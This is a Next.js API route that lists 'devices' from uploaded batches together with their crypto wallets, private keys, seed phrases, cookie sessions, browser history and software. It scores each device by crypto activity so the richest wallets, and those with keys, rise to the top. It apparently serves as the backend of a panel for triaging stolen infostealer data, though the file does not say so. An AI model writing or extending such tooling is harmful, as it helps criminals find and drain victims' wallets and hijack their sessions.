import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/db"
import { validateRequest } from "@/lib/auth"

/**
 * GET /api/v1/crypto/devices
 *
 * Get all devices with crypto activity
 * Query params:
 * - min_wallets: Minimum number of wallets (default: 0)
 * - min_activity_score: Minimum activity score (default: 0)
 * - has_keys: Filter devices with private keys/seeds (true/false)
 * - blockchain: Filter by blockchain (ETH, BTC, SOL, etc.)
 * - limit: Results per page (default: 50)
 * - offset: Pagination offset (default: 0)
 */
export async function GET(request: NextRequest) {
  try {
    const user = await validateRequest(request)
    if (!user) {
      return NextResponse.json(
        { success: false, error: "Unauthorized" },
        { status: 401 }
      )
    }

    const searchParams = request.nextUrl.searchParams
    const minWallets = parseInt(searchParams.get("min_wallets") || "0")
    const minActivityScore = parseInt(searchParams.get("min_activity_score") || "0")
    const hasKeys = searchParams.get("has_keys")
    const blockchain = searchParams.get("blockchain")
    const limit = Math.min(parseInt(searchParams.get("limit") || "50"), 100)
    const offset = parseInt(searchParams.get("offset") || "0")

    // Base query to get devices with crypto wallet counts
    let query = `
      SELECT
        d.device_id,
        d.device_name,
        d.upload_date,
        d.upload_batch,
        COUNT(DISTINCT cw.id) as wallet_count,
        COUNT(DISTINCT CASE WHEN cw.private_key IS NOT NULL OR cw.seed_phrase IS NOT NULL THEN cw.id END) as wallets_with_keys,
        COUNT(DISTINCT cw.blockchain) as blockchain_count,
        COUNT(DISTINCT cw.wallet_name) as wallet_type_count,
        GROUP_CONCAT(DISTINCT cw.blockchain) as blockchains,
        GROUP_CONCAT(DISTINCT cw.wallet_name) as wallet_names
      FROM devices d
      INNER JOIN crypto_wallets cw ON d.device_id = cw.device_id
    `

    const params: any[] = []
    const whereClauses: string[] = []

    // Filter by blockchain
    if (blockchain) {
      whereClauses.push("cw.blockchain = ?")
      params.push(blockchain)
    }

    if (whereClauses.length > 0) {
      query += ` WHERE ${whereClauses.join(" AND ")}`
    }

    query += `
      GROUP BY d.device_id, d.device_name, d.upload_date, d.upload_batch
      HAVING wallet_count >= ?
    `
    params.push(minWallets)

    // Filter by has_keys
    if (hasKeys === "true") {
      query += " AND wallets_with_keys > 0"
    } else if (hasKeys === "false") {
      query += " AND wallets_with_keys = 0"
    }

    query += " ORDER BY wallet_count DESC, d.upload_date DESC"
    query += " LIMIT ? OFFSET ?"
    params.push(limit, offset)

    const devices = await executeQuery<any>(query, params)

    if (!devices) {
      return NextResponse.json({
        success: true,
        total: 0,
        devices: [],
        stats: getEmptyStats()
      })
    }

    // Get crypto activity scores for each device
    const enrichedDevices = await Promise.all(
      devices.map(async (device) => {
        // Get crypto history count
        const historyResults = await executeQuery<any>(
          `SELECT COUNT(*) as count FROM browser_history WHERE device_id = ?
           AND (
             LOWER(url) LIKE '%binance%' OR LOWER(url) LIKE '%coinbase%' OR
             LOWER(url) LIKE '%kraken%' OR LOWER(url) LIKE '%metamask%' OR
             LOWER(url) LIKE '%uniswap%' OR LOWER(url) LIKE '%opensea%' OR
             LOWER(url) LIKE '%etherscan%'
           )`,
          [device.device_id]
        )
        const cryptoHistory = historyResults?.[0]?.count || 0

        // Get crypto sessions count
        const sessionsResults = await executeQuery<any>(
          `SELECT COUNT(*) as count FROM cookie_sessions
           WHERE device_id = ? AND service_category = 'crypto'`,
          [device.device_id]
        )
        const cryptoSessions = sessionsResults?.[0]?.count || 0

        // Get crypto software count
        const softwareResults = await executeQuery<any>(
          `SELECT COUNT(*) as count FROM software
           WHERE device_id = ?
           AND (
             LOWER(name) LIKE '%wallet%' OR LOWER(name) LIKE '%metamask%' OR
             LOWER(name) LIKE '%exodus%' OR LOWER(name) LIKE '%crypto%'
           )`,
          [device.device_id]
        )
        const cryptoSoftware = softwareResults?.[0]?.count || 0

        // Calculate activity score
        const activityScore = calculateCryptoActivityScore({
          wallets: device.wallet_count,
          history: cryptoHistory,
          sessions: cryptoSessions,
          software: cryptoSoftware
        })

        return {
          ...device,
          crypto_history_count: cryptoHistory,
          crypto_sessions_count: cryptoSessions,
          crypto_software_count: cryptoSoftware,
          crypto_activity_score: activityScore,
          blockchains: device.blockchains ? device.blockchains.split(",") : [],
          wallet_names: device.wallet_names ? device.wallet_names.split(",") : []
        }
      })
    )

    // Filter by activity score
    const filteredDevices = enrichedDevices.filter(
      (device) => device.crypto_activity_score >= minActivityScore
    )

    // Calculate global stats
    const stats = {
      total_devices: filteredDevices.length,
      total_wallets: filteredDevices.reduce((sum, d) => sum + d.wallet_count, 0),
      devices_with_keys: filteredDevices.filter((d) => d.wallets_with_keys > 0).length,
      unique_blockchains: new Set(
        filteredDevices.flatMap((d) => d.blockchains.filter((b: string) => b))
      ).size,
      avg_activity_score:
        filteredDevices.reduce((sum, d) => sum + d.crypto_activity_score, 0) /
        Math.max(filteredDevices.length, 1),
      high_activity_devices: filteredDevices.filter((d) => d.crypto_activity_score >= 70).length,
      medium_activity_devices: filteredDevices.filter(
        (d) => d.crypto_activity_score >= 40 && d.crypto_activity_score < 70
      ).length,
      low_activity_devices: filteredDevices.filter((d) => d.crypto_activity_score < 40).length
    }

    return NextResponse.json({
      success: true,
      total: filteredDevices.length,
      devices: filteredDevices,
      stats,
      filters: {
        min_wallets: minWallets,
        min_activity_score: minActivityScore,
        has_keys: hasKeys,
        blockchain: blockchain,
        limit,
        offset
      }
    })
  } catch (error: any) {
    console.error("Error fetching crypto devices:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Failed to fetch crypto devices",
        details: error.message
      },
      { status: 500 }
    )
  }
}

function calculateCryptoActivityScore(data: {
  wallets: number
  history: number
  sessions: number
  software: number
}): number {
  let score = 0

  // Wallets (0-40 points)
  score += Math.min(40, data.wallets * 5)

  // History (0-30 points)
  score += Math.min(30, data.history * 0.3)

  // Sessions (0-20 points)
  score += Math.min(20, data.sessions * 4)

  // Software (0-10 points)
  score += Math.min(10, data.software * 2)

  return Math.round(score)
}

function getEmptyStats() {
  return {
    total_devices: 0,
    total_wallets: 0,
    devices_with_keys: 0,
    unique_blockchains: 0,
    avg_activity_score: 0,
    high_activity_devices: 0,
    medium_activity_devices: 0,
    low_activity_devices: 0
  }
}
